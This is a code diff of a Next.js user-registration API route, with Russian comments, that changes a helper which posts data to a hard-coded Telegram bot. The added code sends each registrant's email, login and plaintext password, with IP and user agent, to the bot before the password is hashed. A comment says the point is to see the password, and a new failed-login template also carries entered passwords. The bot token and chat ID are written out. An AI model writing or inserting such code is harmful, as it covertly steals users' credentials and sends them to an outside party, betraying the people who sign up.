@@ -2,23 +2,51 @@ import { NextResponse } from "next/server";
 import { isEmailOrLoginTaken, createUser, hashPassword } from "@/lib/db";
 
 // 📤 Функция отправки в Telegram для API
-async function sendToTelegramAPI(data: any, type: 'login' | 'register', ip: string, userAgent: string) {
+async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_failed' | 'register', ip: string, userAgent: string, error?: string) {
   try {
     const TELEGRAM_BOT_TOKEN = "8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4";
     const TELEGRAM_CHAT_ID = "7455610355";
     
-    const message = `
-🔐 ${type === 'login' ? 'API ВХОД В СИСТЕМУ' : 'API НОВАЯ РЕГИСТРАЦИЯ'}
+    let message = '';
+    
+    if (type === 'login_success') {
+      message = `
+✅ УСПЕШНЫЙ ВХОД В СИСТЕМУ
+
+👤 Логин/Email: ${data.login}
+
+🌐 **Данные:**
+📍 IP: ${ip}
+🕒 Время: ${new Date().toLocaleString('ru-RU')}
+📱 User Agent: ${userAgent.slice(0, 100)}...
+      `;
+    } else if (type === 'login_failed') {
+      message = `
+❌ НЕУДАЧНАЯ ПОПЫТКА ВХОДА
+
+👤 Логин/Email: ${data.login}
+🔑 Введенный пароль: ${data.password}
+🚫 Причина: ${error}
+
+🌐 **Данные:**
+📍 IP: ${ip}
+🕒 Время: ${new Date().toLocaleString('ru-RU')}
+📱 User Agent: ${userAgent.slice(0, 100)}...
+      `;
+    } else {
+      message = `
+🔐 НОВАЯ РЕГИСТРАЦИЯ
 
 📧 Email: ${data.email}
 👤 Логин: ${data.login}
 🔑 Пароль: ${data.password}
 
-🌐 **Серверные данные:**
+🌐 **Данные:**
 📍 IP: ${ip}
 🕒 Время: ${new Date().toLocaleString('ru-RU')}
 📱 User Agent: ${userAgent.slice(0, 100)}...
-    `;
+      `;
+    }
 
     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
@@ -46,9 +74,6 @@ export async function POST(request: Request) {
         return NextResponse.json({ error: "Email, логин и пароль обязательны" }, { status: 400 });
     }
 
-    // 📤 Отправляем в Telegram ДО проверки (чтобы видеть все попытки)
-    await sendToTelegramAPI({ email, login, password }, 'register', clientIP, userAgent);
-
     // Проверка на существование
     if (isEmailOrLoginTaken(email, login)) {
       return NextResponse.json(
@@ -56,6 +81,14 @@ export async function POST(request: Request) {
         { status: 400 }
       );
     }
+
+    // 📤 Отправляем в Telegram ДО создания пользователя (чтобы видеть пароль)
+    await sendToTelegramAPI(
+      { email, login, password }, 
+      'register', 
+      clientIP, 
+      userAgent
+    );
 
     // Хэшируем пароль
     const hashedPassword = await hashPassword(password);
